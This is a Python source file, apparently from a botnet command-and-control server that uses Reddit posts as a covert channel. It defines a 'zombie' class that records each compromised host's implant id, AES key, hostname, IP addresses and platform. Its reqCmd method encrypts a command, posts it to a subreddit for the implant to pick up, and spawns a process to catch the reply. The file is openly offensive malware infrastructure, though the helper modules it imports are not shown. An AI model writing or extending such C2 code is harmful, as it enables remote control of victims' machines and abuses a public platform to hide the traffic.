#!/usr/bin/env python3 

import praw
from mysql import connector
from datetime import datetime
import random
import engine
import database
import multiprocessing
import channel
import globals


class zombie:

	def __init__(self, channel, associated_account, zid, aes_key, implant_id, hostname, priv_ip, pub_ip, platform, first_check, last_check):

		self.zid = zid
		self.aes_key = aes_key
		self.hostname = hostname
		self.priv_ip = priv_ip
		self.pub_ip = pub_ip
		self.channel = channel
		self.platform = platform
		self.associated_account = associated_account
		self.last_check = datetime.now()
		self.first_check = datetime.now()
		self.implant_id = implant_id


	def reqCmd(self, cmd, cmd_id):

		rawData = cmd_id + ":::::" + globals.CHANNEL_VERIFY + ":::::" + cmd

		encData = engine.encrypt(self.aes_key, rawData)
		postTitle = self.zid + ":" + globals.CMD_REQ_ID + ":" + engine.buildRandom(random.randint(8,15))

		submission = (self.channel.account.buildRedditObj().subreddit(self.channel.subreddit)).submit(postTitle, selftext=encData)
		probe = multiprocessing.Process(target=self.channel.catchCommandResponse, args=(submission.id, cmd_id, self))
		probe.start()

		return 0
		

	def updateLastCheck(self):

		self.last_check = datetime.now()
		database.updateZombieTimestamp(self.zid)

